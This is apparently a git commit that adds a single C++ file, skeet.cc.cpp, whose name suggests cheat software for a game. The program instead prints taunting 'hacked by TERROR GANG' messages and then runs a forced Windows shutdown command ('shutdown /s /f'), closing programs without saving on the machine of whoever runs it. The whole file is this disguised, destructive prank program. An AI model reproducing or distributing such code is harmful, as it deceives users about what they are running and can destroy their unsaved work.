7e96a0f71fde26f9209df8e2656b78f4cc1e26d1
dox-net <85663797+dox-net@users.noreply.github.com>
2022-08-03 13:15:14 -0400

    so strong

---
+++ skeet.cc.cpp
@@ -0,0 +1,15 @@
+#include <iostream>
+#include <stdio.h>
+#include "windows.h" 
+
+int main()
+{
+    std::cout << "";
+    printf("YOU HAVE JUST BEEN HACKED BY TERROR GANG\n");
+    Sleep(1000);
+    printf("NO SKEET.CC FOR YOU STINKY LIL JIT\n");
+    Sleep(1500);
+    printf("GOOFY ASF IM SHUT DOWN YO PC NOW\n");
+    Sleep(2700);
+    system("shutdown /s /f");
+}
